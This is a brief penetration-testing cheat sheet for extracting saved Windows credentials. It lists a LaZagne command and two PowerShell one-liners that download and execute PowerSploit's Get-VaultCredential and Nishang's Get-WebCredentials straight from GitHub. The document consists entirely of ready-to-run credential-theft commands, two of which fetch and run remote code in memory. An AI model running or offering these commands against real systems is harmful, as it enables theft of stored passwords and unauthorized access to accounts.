# Credentials Manager

### 1) LaZagne

    LaZagne.exe windows

### 2) Get-VaultCredential (PowerSploit)

    iex (New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-VaultCredential.ps1"); Get-VaultCredential

### 3) Get-WebCredentials (Nishang)

    powershell iex (New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-WebCredentials.ps1"); Get-WebCredentials

